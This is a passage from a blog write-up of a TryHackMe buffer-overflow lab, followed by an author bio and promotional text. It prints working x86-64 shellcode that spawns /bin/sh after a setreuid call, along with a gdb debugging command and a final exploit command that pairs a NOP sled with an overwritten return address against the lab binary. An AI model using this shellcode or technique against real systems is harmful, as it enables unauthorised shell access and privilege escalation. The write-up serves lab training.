src="https://cdn-images-1.medium.com/max/800/0*2jo71HllRH8n8E_z.png"
class="graf-image" data-image-id="0*2jo71HllRH8n8E_z.png"
data-width="740" data-height="91" />
</figure>

``` {#23a6 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python-repl"}
>>> payload = 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6>>> len(payload)
169
```

Let's debug:

``` {#31fd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
run $(python -c "print('A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6)")
```

<figure id="790b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*PKFZLOZJM3vmwwMY.png"
class="graf-image" data-image-id="0*PKFZLOZJM3vmwwMY.png"
data-width="875" data-height="212" />
</figure>

<figure id="0791" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*_l_FEwOLREt_6VJ9.png"
class="graf-image" data-image-id="0*_l_FEwOLREt_6VJ9.png"
data-width="875" data-height="503" />
</figure>

Let's take **0x7fffffffe278** as return address (between future NOP sled
and beginning of shell code).

**Payload**

Now, our payload is ready:

``` {#96b5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
./buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f')")
```

<figure id="d436" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*dz5Iiey-jOh6OYG1.png"
class="graf-image" data-image-id="0*dz5Iiey-jOh6OYG1.png"
data-width="875" data-height="163" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#0fe1 .graf .graf--h3 .graf-after--figure name="0fe1"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#4c90 .graf .graf--h3 .graf-after--p name="4c90"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 3, 2024](https://medium.com/p/9c420d21da11).

[Canonical
link](https://medium.com/@bevijaygupta/buffer-overflows-tryhackme-writeup-9c420d21da11){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
